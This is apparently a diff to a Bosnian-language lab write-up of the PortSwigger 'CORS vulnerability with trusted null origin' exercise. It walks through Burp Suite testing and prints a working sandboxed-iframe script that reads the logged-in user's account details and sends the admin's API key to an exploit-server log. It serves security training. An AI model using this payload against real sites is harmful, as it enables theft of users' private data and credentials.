@@ -81,13 +81,67 @@ Skripta šalje asinhroni `GET` zahtjev ka ranjivom endpointu (uz slanje kolači�
 
 <img width="1920" height="1080" alt="Screenshot 2026-04-12 160205" src="https://github.com/user-attachments/assets/25d3e5f9-e015-49cd-ba1c-f45cb33dc4fa" />
 
+### Lab 2: CORS vulnerability with trusted null origin (Težina: Zeleni)
 
+**Cilj zadatka:** Aplikacija posjeduje nesigurnu CORS konfiguraciju jer eksplicitno vjeruje `null` vrijednosti u `Origin` zaglavlju. Cilj je konstruisati JavaScript napad unutar izolovanog (sandboxed) ifrejma kako bi se generisao `Origin: null` zahtjev, ukrao privatni API ključ administratora i uspješno podnio kao rješenje.
 
+**Metodologija i koraci rješavanja:**
 
+1. **Prijava na sistem i praćenje saobraćaja:**
+   Proces je započet prijavom na aplikaciju korišćenjem testnih korisničkih kredencijala (`wiener:peter`).
+   
+<img width="1920" height="1080" alt="Screenshot 2026-04-12 162206" src="https://github.com/user-attachments/assets/02555f2e-c603-49c4-9305-7d73bc6253c8" />
 
+   Otvaranjem korisničkog profila, u Burp Suite alatu (tab HTTP history) zabilježen je HTTP `GET` zahtjev ka putanji `/accountDetails`, koji u svom odgovoru vraća privatne korisničke podatke (uključujući i API ključ). Ovaj zahtjev u originalnom obliku ne sadrži `Origin` zaglavlje.
+   
+<img width="1920" height="1080" alt="Screenshot 2026-04-12 162228" src="https://github.com/user-attachments/assets/d921d8c8-13f8-4649-b3cf-5bc1ffe0dad0" />
 
+2. **Potvrda ranjivosti (Vjerovanje null origin-u):**
+   Zahtjev je proslijeđen u alat **Repeater**. Kako bismo testirali ponašanje servera, ručno je dodato novo zaglavlje `Origin: null`.
+   
+<img width="1920" height="1080" alt="Screenshot 2026-04-12 162241" src="https://github.com/user-attachments/assets/547a62f9-27e8-4a6b-9674-7c91474ba9b4" />
 
+   Slanjem ovako modifikovanog zahtjeva, server je odgovorio sa zaglavljima `Access-Control-Allow-Origin: null` i `Access-Control-Allow-Credentials: true`. Ovo potvrđuje ozbiljnu ranjivost – server je spreman da podijeli podatke o ulogovanom korisniku sa bilo kojim dokumentom koji se predstavlja kao `null` origin.
+   
+<img width="1920" height="1080" alt="Screenshot 2026-04-12 162433" src="https://github.com/user-attachments/assets/8b927b51-aacc-43c0-8968-875a4233040a" />
 
+3. **Priprema i isporuka zlonamjerne skripte (Sandboxed Iframe):**
+   Za eksploataciju je iskorišćen ugrađeni Exploit server. 
+   
+<img width="1920" height="1080" alt="Screenshot 2026-04-12 162600" src="https://github.com/user-attachments/assets/f0c2abb6-2b13-4d76-b1a0-ef53e111866d" />
+
+   Pošto browseri automatski dodjeljuju `null` origin zahtjevima koji potiču iz izolovanih okruženja, u tijelo (Body) Exploit servera je ubačen HTML kod sa `iframe` elementom koji sadrži atribut `sandbox`. Unutar njega je definisana JavaScript skripta koja upućuje zahtjev za čitanje API ključa:
+   
+   ````html
+   <iframe sandbox="allow-scripts allow-top-navigation allow-forms" src="data:text/html,<script>
+       var req = new XMLHttpRequest();
+       req.onload = reqListener;
+       req.open('get','[https://0a09006f032e121380ba49da00140033.web-security-academy.net/accountDetails',true](https://0a09006f032e121380ba49da00140033.web-security-academy.net/accountDetails',true));
+       req.withCredentials = true;
+       req.send();
+
+       function reqListener() {
+           location='[https://exploit-0a37004f039d1275806c483a01cf006a.exploit-server.net/log?key='+this.responseText](https://exploit-0a37004f039d1275806c483a01cf006a.exploit-server.net/log?key='+this.responseText);
+       };
+   </script>"></iframe>
+````
+
+Skripta je sačuvana (Store) i isporučena (Deliver exploit to victim), čime je administrator natjeran da učita ovaj zlonamjerni ifrejm.
+
+<img width="1920" height="1080" alt="Screenshot 2026-04-12 162622" src="https://github.com/user-attachments/assets/02514326-24f5-4692-aa1a-e4684c0715d4" />
+
+4.  **Krađa API ključa i rješavanje laboratorije:**
+    Na Exploit serveru je otvoren "Access log". Evidentiran je novi log zapis u kom se jasno vidi HTTP zahtjev koji sadrži JSON objekat sa ukradenim API ključem administratora.
+
+<img width="1920" height="1080" alt="Screenshot 2026-04-12 162646" src="https://github.com/user-attachments/assets/369195de-557e-4e82-8229-2506ad811109" />
+
+   Ključ je iskopiran i proslijeđen aplikaciji kroz opciju "Submit solution".
+
+<img width="1920" height="1080" alt="Screenshot 2026-04-12 162711" src="https://github.com/user-attachments/assets/a493fc3b-5cac-42a7-abbb-34ce6f6524c8" />
+
+   Sistem je prihvatio ključ, uspješno ovjerio rješenje i laboratorija je time zvanično riješena.
+
+<img width="1920" height="1080" alt="Screenshot 2026-04-12 162721" src="https://github.com/user-attachments/assets/b9af813f-a1e7-48ec-aefa-2bd3a48546da" />
 
 
 
